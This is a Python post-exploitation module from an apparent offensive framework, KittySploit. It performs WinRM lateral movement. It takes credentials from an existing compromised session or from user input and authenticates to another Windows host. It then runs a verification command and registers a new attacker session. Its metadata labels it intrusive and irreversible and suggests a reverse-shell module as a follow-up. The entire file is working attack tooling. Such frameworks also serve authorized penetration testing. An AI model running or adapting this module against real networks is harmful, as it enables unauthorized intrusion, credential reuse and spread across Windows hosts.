#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Pivot from an existing WinRM session (or supplied credentials) to another
Windows host over WinRM and register a new framework session.
"""

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin

try:
	from pypsrp.client import Client
	PYPSRP_AVAILABLE = True
except Exception:
	Client = None
	PYPSRP_AVAILABLE = False


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Lateral Movement",
		"description": (
			"Authenticate to a remote host via WinRM using supplied credentials "
			"(or credentials from the current session metadata) and open a new WinRM session."
		),
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1021.006/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation", "lateral_movement"],
			"expected_requests": 3,
			"reversible": False,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["authenticated_session", "credentials"],
				"produces_capabilities": ["authenticated_session", "winrm_access"],
				"suggested_followups": [
					"post/winrm/gather/enum_system",
					"post/winrm/manage/spawn_reverse_shell",
				],
			},
		},
	}

	rhost = OptString("", "Target host for lateral WinRM", True)
	rport = OptPort(5985, "WinRM port (5985 HTTP / 5986 HTTPS)", True)
	ssl = OptBool(False, "Use HTTPS WinRM transport", False)
	username = OptString("", "Username (empty = reuse current session username)", False)
	password = OptString("", "Password for the target host", False)
	domain = OptString("", "Domain (optional)", False)
	auth = OptChoice(
		"negotiate",
		"WinRM authentication method",
		False,
		choices=["negotiate", "ntlm", "kerberos", "basic", "credssp"],
	)
	cert_validation = OptBool(False, "Validate TLS certificate when ssl=True", False)
	test_command = OptString("whoami", "Verification command on the new host", False)

	def _resolve_credentials(self) -> tuple:
		username = str(self.username or "").strip()
		password = str(self.password or "").strip()
		domain = str(self.domain or "").strip()

		info = self.winrm_session_info()
		session = self._resolve_session()
		data = getattr(session, "data", None) if session else {}
		if not isinstance(data, dict):
			data = {}

		if not username:
			username = str(info.get("username") or data.get("username") or "").strip()
		if not password:
			password = str(data.get("password") or "").strip()
		if not domain:
			domain = str(data.get("domain") or "").strip()

		return username, password, domain

	def _register_session(self, client, host: str, port: int, meta: dict) -> str:
		listener = None
		if self.framework:
			listener = self.framework.load_module("listeners/windows/winrm_kerberos")
		if not listener:
			raise ProcedureError(
				FailureType.Unknown,
				"Could not load listeners/windows/winrm_kerberos for session registration",
			)
		listener.framework = self.framework
		if not hasattr(listener, "_session_connections"):
			listener._session_connections = {}

		session_id = listener._create_session_from_connection_data(
			client,
			host,
			port,
			meta,
		)
		if not session_id:
			raise ProcedureError(FailureType.Unknown, "Failed to register WinRM session")
		return session_id

	def run(self):
		try:
			if not PYPSRP_AVAILABLE:
				raise ProcedureError(
					FailureType.NotCompatible,
					"pypsrp is not installed (pip install pypsrp)",
				)

			host = str(self.rhost or "").strip()
			if not host:
				raise ProcedureError(FailureType.ConfigurationError, "rhost is required")

			port = int(self.rport or 5985)
			ssl = bool(self.ssl)
			auth = str(self.auth or "negotiate").lower()
			username, password, domain = self._resolve_credentials()

			if auth not in ("kerberos",) and not username:
				raise ProcedureError(
					FailureType.ConfigurationError,
					"username is required (or present on the current session)",
				)
			if auth not in ("kerberos",) and not password:
				raise ProcedureError(
					FailureType.ConfigurationError,
					"password is required for non-Kerberos lateral WinRM",
				)

			user_for_client = username
			if domain and "\\" not in username and "@" not in username:
				user_for_client = f"{domain}\\{username}"

			print_info("=" * 70)
			print_info("WinRM Lateral Movement")
			print_info("=" * 70)
			print_info(f"Target: {host}:{port} (ssl={ssl}, auth={auth})")
			print_info(f"User:   {user_for_client or '(kerberos ticket)'}")
			print_info("")

			kwargs = {
				"port": port,
				"ssl": ssl,
				"auth": auth,
				"cert_validation": bool(self.cert_validation),
			}
			if username:
				kwargs["username"] = user_for_client
			if password:
				kwargs["password"] = password

			print_status("Connecting...")
			client = Client(host, **kwargs)

			test_cmd = str(self.test_command or "whoami").strip() or "whoami"
			stdout, stderr, rc = client.execute_cmd(test_cmd)
			if rc != 0:
				print_warning(f"Verification command returned {rc}")
				if stderr:
					print_info(str(stderr).strip())
			else:
				print_success("Remote WinRM session verified")
				if stdout:
					print_info(str(stdout).strip())

			meta = {
				"username": username,
				"password": password,
				"domain": domain,
				"ssl": ssl,
				"auth": auth,
				"platform": "windows",
				"host": host,
				"port": port,
				"lateral_from": str(self.session_id or ""),
			}
			session_id = self._register_session(client, host, port, meta)
			print_success(f"New WinRM session created: {session_id}")
			print_info("Use `sessions -i <id>` to interact")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM lateral movement error: {exc}")
